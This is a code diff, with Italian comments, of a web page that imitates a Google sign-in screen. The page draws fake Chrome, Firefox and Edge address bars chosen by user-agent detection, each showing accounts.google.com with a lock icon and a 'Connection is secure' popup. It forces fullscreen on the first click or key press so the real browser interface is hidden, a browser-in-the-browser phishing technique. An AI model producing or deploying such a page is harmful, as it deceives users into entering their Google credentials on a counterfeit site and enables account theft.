-            <button class="ff-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
-            <button class="ff-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg></button>
-            <div class="ed-omnibox">
-                <svg width="14" height="14" viewBox="0 0 24 24" style="color:#666; margin-right:8px;"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
-                <input type="text" style="flex:1; border:none; outline:none; background:transparent;" value="https://accounts.google.com/signin" readonly>
-            </div>
-            <button class="ff-btn"><svg width="16" height="16" viewBox="0 0 24 24"><path d="M6 10c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></button>
-        </div>
-
-        <!-- ==================================================================
-             CONTENUTO PAGINA GOOGLE
-             ================================================================== -->
-        <div class="content">
-            <div class="login-container">
-                <div class="header">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
-                        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
-                        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
-                        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                <!-- Stella (Aggiungi ai segnalibri) -->
+                <button class="action-icon" id="cr-star" title="Aggiungi ai segnalibri">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27 18.18 21l-1.63-7.03L22 9.24zM12 15.4l-3.76 2.27 1-4.28-3.32-2.88 4.38-.38L12 6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z"/>
                     </svg>
-                    <h1>Accedi</h1>
-                    <p>Utilizza il tuo Account Google</p>
+                </button>
+            </div>
+        </div>
+
+        <!-- Popup informazioni sito Chrome -->
+        <div class="cr-popup" id="cr-popup">
+            <div class="cr-popup-header">
+                <svg viewBox="0 0 24 24">
+                    <path d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"/>
+                </svg>
+                <div class="site-domain">google.com</div>
+            </div>
+
+            <div class="cr-popup-row">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zm6 10v8H6v-8h12zm-9-2V7c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9z"/>
+                </svg>
+                <div class="site-text">Connection is secure</div>
+                <div class="arrow-right">›</div>
+            </div>
+
+            <div class="cr-popup-row">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
+                </svg>
+                <div>
+                    Cookies and site data
+                    <div class="site-text-sub">Manage on device site data</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Icona estensioni Chrome -->
+        <button class="cr-btn" title="Estensioni">
+            <svg width="18" height="18" viewBox="0 0 24 24">
+                <path d="M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z"/>
+            </svg>
+        </button>
+
+        <!-- Profilo utente Chrome (icona circolare senza testo) -->
+        <button class="cr-profile" title="Profilo">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+            </svg>
+        </button>
+
+        <!-- Menu 3 pallini Chrome -->
+        <button class="cr-btn cr-menu-btn" title="Personalizza e controlla Google Chrome">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
+            </svg>
+        </button>
+    </div>
+
+    <!-- ==========================================================================
+         BARRA FIREFOX (visibile solo se rileva Firefox)
+         ========================================================================== -->
+    <div id="firefox-bar" class="browser-ui">
+        <!-- Freccia indietro -->
+        <button class="ff-btn disabled" title="Indietro">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+            </svg>
+        </button>
+
+        <!-- Freccia avanti -->
+        <button class="ff-btn disabled" title="Avanti">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/>
+            </svg>
+        </button>
+
+        <!-- Ricarica -->
+        <button class="ff-btn" onclick="location.reload()" title="Ricarica">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+            </svg>
+        </button>
+
+        <!-- Barra degli indirizzi Firefox -->
+        <div class="ff-urlbar" id="ff-urlbar">
+            <!-- Scudo protezione tracciamento -->
+            <div class="ff-shield" title="Protezione antitracciamento avanzata">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 19.93V3.13l7 3.11v4.76c0 4.52-2.98 8.69-7 9.93z"/>
+                </svg>
+            </div>
+
+            <!-- Lucchetto HTTPS -->
+            <div class="ff-lock" title="Connessione sicura">
+                <svg viewBox="0 0 24 24">
+                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                </svg>
+            </div>
+
+            <!-- Input URL Firefox -->
+            <input 
+                type="text" 
+                class="ff-input" 
+                value="https://accounts.google.com/signin" 
+                readonly
+                id="ff-url"
+            >
+        </div>
+
+        <!-- Menu hamburger Firefox -->
+        <button class="ff-btn ff-hamburger" title="Menu">
+            <svg viewBox="0 0 24 24">
+                <path d="M4 18h16c.55 0 1-.45 1-1s-.45-1-1-1H4c-.55 0-1 .45-1 1s.45 1 1 1zm0-5h16c.55 0 1-.45 1-1s-.45-1-1-1H4c-.55 0-1 .45-1 1s.45 1 1 1zM3 7c0 .55.45 1 1 1h16c.55 0 1-.45 1-1s-.45-1-1-1H4c-.55 0-1 .45-1 1z"/>
+            </svg>
+        </button>
+    </div>
+
+    <!-- ==========================================================================
+         BARRA EDGE/OPERA (visibile solo se rileva Edge/Opera)
+         ========================================================================== -->
+    <div id="edge-bar" class="browser-ui">
+        <!-- Freccia indietro -->
+        <button class="ed-btn disabled" title="Indietro">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+            </svg>
+        </button>
+
+        <!-- Freccia avanti -->
+        <button class="ed-btn disabled" title="Avanti">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/>
+            </svg>
+        </button>
+
+        <!-- Ricarica -->
+        <button class="ed-btn" onclick="location.reload()" title="Ricarica">
+            <svg width="16" height="16" viewBox="0 0 24 24">
+                <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+            </svg>
+        </button>
+
+        <!-- Barra degli indirizzi Edge -->
+        <div class="ed-omnibox" id="ed-omnibox">
+            <svg viewBox="0 0 24 24">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
+            </svg>
+            <input 
+                type="text" 
+                class="ed-input" 
+                value="https://accounts.google.com/signin" 
+                readonly
+                id="ed-url"
+            >
+        </div>
+
+        <!-- Menu 3 pallini orizzontali Edge -->
+        <button class="ed-btn ed-menu" title="Impostazioni e altro">
+            <svg viewBox="0 0 24 24">
+                <path d="M6 10c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
+            </svg>
+        </button>
+    </div>
+
+    <!-- ==========================================================================
+         AREA CONTENUTO PRINCIPALE (Form Login Google)
+         ========================================================================== -->
+    <div class="content">
+        <div class="login-container">
+            
+            <!-- Header con logo Google -->
+            <div class="header">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
+                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                </svg>
+                <h1>Accedi</h1>
+                <p>Utilizza il tuo Account Google</p>
+            </div>
+
+            <!-- Form di login -->
+            <form class="form" id="g-form" novalidate>
+                
+                <!-- Campo Email con label fluttuante -->
+                <div class="form-group">
+                    <input 
+                        type="text" 
+                        class="form-control" 
+                        required 
+                        placeholder=" " 
+                        id="emailInp"
+                        autocomplete="username"
+                    >
+                    <label class="class-label">Email o numero di telefono</label>
+                    <span class="error-message">Inserisci un indirizzo email o un numero di telefono valido</span>
                 </div>
 
-                <form class="form" id="g-form" novalidate>
-                    <div class="form-group">
-                        <input type="text" class="form-control" required placeholder=" " id="emailInp">
-                        <label class="class-label">Email o numero di telefono</label>
-                        <span class="error-message">Inserisci un indirizzo email o un numero di telefono valido</span>
-                    </div>
-                    <div class="links-action"><a href="#" class="forgot-link">Hai dimenticato l'email?</a></div>
-                    <div class="guest-notice">Non si tratta del tuo computer? Utilizza la modalità Ospite per accedere privatamente. <a href="#">Ulteriori informazioni</a></div>
-                    <div class="bottom-buttons">
-                        <a href="#" class="create-account">Crea un account</a>
-                        <button type="submit" class="form-button">Avanti</button>
-                    </div>
-                </form>
-            </div>
+                <!-- Link "Hai dimenticato l'email?" -->
+                <div class="links-action">
+                    <a href="#" class="forgot-link">Hai dimenticato l'email?</a>
+                </div>
+
+                <!-- Testo informativo modalità Ospite -->
+                <div class="guest-notice">
+                    Non si tratta del tuo computer? Utilizza la modalità Ospite per accedere privatamente. 
+                    <a href="#">Ulteriori informazioni</a>
+                </div>
+
+                <!-- Pulsanti inferiori -->
+                <div class="bottom-buttons">
+                    <a href="#" class="create-account">Crea un account</a>
+                    <button type="submit" class="form-button">Avanti</button>
+                </div>
+                
+            </form>
+
         </div>
     </div>
 
+    <!-- ==========================================================================
+         JAVASCRIPT - Logica di rilevamento browser e interazioni
+         ========================================================================== -->
     <script>
-        // --- 1. RILEVA IL BROWSER ESATTO ---
+        // =======================================================================
+        // FUNZIONE 1: RILEVA IL BROWSER E MOSTRA LA BARRA CORRETTA
+        // =======================================================================
         function detectBrowserAndShowBar() {
-            const ua = navigator.userAgent;
-            if (ua.includes("Firefox")) {
+            const userAgent = navigator.userAgent;
+            
+            // Rileva Firefox
+            if (userAgent.includes("Firefox")) {
                 document.getElementById('firefox-bar').style.display = 'flex';
-            } else if (ua.includes("Edg") || ua.includes("OPR") || ua.includes("Opera")) {
+                console.log('Browser rilevato: Firefox');
+                return 'firefox';
+            } 
+            
+            // Rileva Edge
+            else if (userAgent.includes("Edg")) {
                 document.getElementById('edge-bar').style.display = 'flex';
-            } else {
-                // Default a Chrome se non è nessuno dei precedenti
+                console.log('Browser rilevato: Edge');
+                return 'edge';
+            } 
+            
+            // Rileva Opera
+            else if (userAgent.includes("OPR") || userAgent.includes("Opera")) {
+                document.getElementById('edge-bar').style.display = 'flex';
+                console.log('Browser rilevato: Opera');
+                return 'opera';
+            } 
+            
+            // Default: Chrome o browser basato su Chromium
+            else {
                 document.getElementById('chrome-bar').style.display = 'flex';
+                console.log('Browser rilevato: Chrome/Chromium');
+                return 'chrome';
             }
         }
 
-        // --- 2. GESTIONE EFFETTI VISIVI BARRE ---
-        
-        // Effetto Blur/Focus Chrome
-        const crOmni = document.getElementById('cr-omnibox');
-        if(crOmni) {
-            crOmni.addEventListener('click', (e) => {
+        // =======================================================================
+        // FUNZIONE 2: GESTIONE FOCUS OMNIBOX CHROME
+        // =======================================================================
+        const crOmnibox = document.getElementById('cr-omnibox');
+        const crUrlInput = document.getElementById('cr-url');
+
+        if (crOmnibox && crUrlInput) {
+            crOmnibox.addEventListener('click', function(e) {
                 e.stopPropagation();
-                crOmni.classList.add('focused');
-                crOmni.querySelector('input').select();
+                crOmnibox.classList.add('focused');
+                crUrlInput.select();
             });
         }
 
-        // Effetto Blur/Focus Firefox
-        const ffOmni = document.getElementById('ff-omnibox');
-        if(ffOmni) {
-            ffOmni.addEventListener('click', (e) => {
+        // =======================================================================
+        // FUNZIONE 3: GESTIONE FOCUS OMNIBOX FIREFOX
+        // =======================================================================
+        const ffUrlbar = document.getElementById('ff-urlbar');
+        const ffUrlInput = document.getElementById('ff-url');
+
+        if (ffUrlbar && ffUrlInput) {
+            ffUrlbar.addEventListener('click', function(e) {
                 e.stopPropagation();
-                ffOmni.classList.add('focused');
-                ffOmni.querySelector('input').select();
+                ffUrlbar.classList.add('focused');
+                ffUrlInput.select();
             });
         }
 
-        // --- 3. POPUP CHROME IMPOSTAZIONI SITO ---
+        // =======================================================================
+        // FUNZIONE 4: GESTIONE FOCUS OMNIBOX EDGE
+        // =======================================================================
+        const edOmnibox = document.getElementById('ed-omnibox');
+        const edUrlInput = document.getElementById('ed-url');
+
+        if (edOmnibox && edUrlInput) {
+            edOmnibox.addEventListener('click', function(e) {
+                e.stopPropagation();
+                edOmnibox.classList.add('focused');
+                edUrlInput.select();
+            });
+        }
+
+        // =======================================================================
+        // FUNZIONE 5: POPUP INFORMAZIONI SITO CHROME
+        // =======================================================================
         const crSiteBtn = document.getElementById('cr-siteBtn');
         const crPopup = document.getElementById('cr-popup');
-        
-        if(crSiteBtn && crPopup) {
-            crSiteBtn.addEventListener('click', (e) => {
+
+        if (crSiteBtn && crPopup) {
+            crSiteBtn.addEventListener('click', function(e) {
                 e.stopPropagation();
                 crPopup.classList.toggle('active');
             });
         }
 
-        // --- 4. GESTIONE CLICK FUORI (Chiude popup e toglie focus) ---
-        document.addEventListener('click', () => {
-            if(crPopup) crPopup.classList.remove('active');
-            if(crOmni) crOmni.classList.remove('focused');
-            if(ffOmni) ffOmni.classList.remove('focused');
-        });
+        // =======================================================================
+        // FUNZIONE 6: STELLA CHROME (Piena/Vuota)
+        // =======================================================================
+        const crStar = document.getElementById('cr-star');
 
-        // --- 5. LOGICA FORM GOOGLE ---
-        const form = document.getElementById('g-form');
-        form.addEventListener('submit', function(e) {
-            form.classList.add('submitted');
-            if (!form.checkValidity()) e.preventDefault();
-        });
-
-        // --- 6. LOGICA FULLSCREEN E AVVIO ---
-        let isStarted = false;
-        
-        function goFullscreen() {
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) { elem.requestFullscreen().catch(()=>{}); }
-            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
+        if (crStar) {
+            crStar.addEventListener('click', function() {
+                const svg = this.querySelector('svg');
+                const currentPath = svg.querySelector('path').getAttribute('d');
+                
+                // Controlla se è vuota (stella outline)
+                if (currentPath.includes('12 15.4')) {
+                    // Cambia a piena
+                    svg.querySelector('path').setAttribute('d', 'M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z');
+                    svg.style.fill = '#1a73e8';
+                } else {
+                    // Cambia a vuota
+                    svg.querySelector('path').setAttribute('d', 'M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27 18.18 21l-1.63-7.03L22 9.24zM12 15.4l-3.76 2.27 1-4.28-3.32-2.88 4.38-.38L12 6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z');
+                    svg.style.fill = 'currentColor';
+                }
+            });
         }
 
-        document.body.addEventListener('click', () => {
-            if (isStarted) return;
-            isStarted = true;
+        // =======================================================================
+        // FUNZIONE 7: CHIUSURA POPUP E RIMOZIONE FOCUS AL CLICK FUORI
+        // =======================================================================
+        document.addEventListener('click', function() {
+            // Rimuove focus da tutte le omnibox
+            if (crOmnibox) crOmnibox.classList.remove('focused');
+            if (ffUrlbar) ffUrlbar.classList.remove('focused');
+            if (edOmnibox) edOmnibox.classList.remove('focused');
             
-            goFullscreen();
-            
-            // Nasconde schermata iniziale, mostra il vero contenuto
-            document.getElementById('start-screen').style.display = 'none';
-            document.getElementById('main-wrapper').style.display = 'flex';
-            document.body.style.cursor = 'default';
-            
-            // Capisce che barra mostrare
-            detectBrowserAndShowBar();
-            
-            // Foca l'input email
-            setTimeout(() => document.getElementById('emailInp').focus(), 100);
+            // Chiude il popup Chrome
+            if (crPopup) crPopup.classList.remove('active');
         });
+
+        // =======================================================================
+        // FUNZIONE 8: VALIDAZIONE FORM GOOGLE
+        // =======================================================================
+        const gForm = document.getElementById('g-form');
+
+        gForm.addEventListener('submit', function(e) {
+            gForm.classList.add('submitted');
+            
+            if (!gForm.checkValidity()) {
+                e.preventDefault();
+            }
+        });
+
+        // =======================================================================
+        // FUNZIONE 9: FULLSCREEN AUTOMATICO
+        // =======================================================================
+        function goFullscreen() {
+            const elem = document.documentElement;
+            
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.warn('Fullscreen non disponibile:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            } else if (elem.mozRequestFullScreen) {
+                elem.mozRequestFullScreen();
+            }
+        }
+
+        // =======================================================================
+        // FUNZIONE 10: INIZIALIZZAZIONE AL PRIMO CLICK
+        // =======================================================================
+        let isInitialized = false;
+
+        document.body.addEventListener('click', function initApp() {
+            if (isInitialized) return;
+            isInitialized = true;
+
+            // Attiva fullscreen
+            goFullscreen();
+
+            // Rileva browser e mostra barra corretta
+            const browser = detectBrowserAndShowBar();
+
+            // Focus automatico sull'input email
+            setTimeout(() => {
+                const emailInput = document.getElementById('emailInp');
+                if (emailInput) emailInput.focus();
+            }, 100);
+
+            console.log(`Applicazione inizializzata. Browser: ${browser}`);
+        }, { once: true });
+
+        // =======================================================================
+        // FUNZIONE 11: INIZIALIZZAZIONE CON TASTO TASTIERA
+        // =======================================================================
+        document.addEventListener('keydown', function initAppKey() {
+            if (isInitialized) return;
+            isInitialized = true;
+
+            goFullscreen();
+            const browser = detectBrowserAndShowBar();
+
+            setTimeout(() => {
+                const emailInput = document.getElementById('emailInp');
+                if (emailInput) emailInput.focus();
+            }, 100);
+
+            console.log(`Applicazione inizializzata con tastiera. Browser: ${browser}`);
+        }, { once: true });
+
+        // =======================================================================
+        // CONSOLE LOG FINALE
+        // =======================================================================
+        console.log('Sistema di rilevamento browser caricato.');
+        console.log('Clicca ovunque o premi un tasto per avviare l\'applicazione.');
     </script>
+
 </body>
 </html>
